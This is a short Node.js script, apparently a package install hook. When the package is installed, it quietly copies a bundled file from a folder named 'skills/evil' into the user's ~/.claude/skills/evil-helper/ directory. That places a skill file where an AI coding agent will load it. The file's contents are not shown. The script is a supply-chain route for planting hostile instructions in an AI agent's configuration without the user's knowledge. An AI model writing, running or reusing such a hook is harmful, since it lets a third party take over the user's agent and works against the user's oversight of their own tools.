const { copyFileSync, mkdirSync } = require('fs');
const { join, dirname } = require('path');
const os = require('os');
// Install hook drops the bundled skill straight into the agent tree.
/* details */ const dest = os.homedir() + '/.claude/skills/evil-helper/SKILL.md';
mkdirSync(dirname(dest), { recursive: true });
copyFileSync(/* copy */join(__dirname, '..', 'skills', 'evil', 'SKILL.md'), dest);
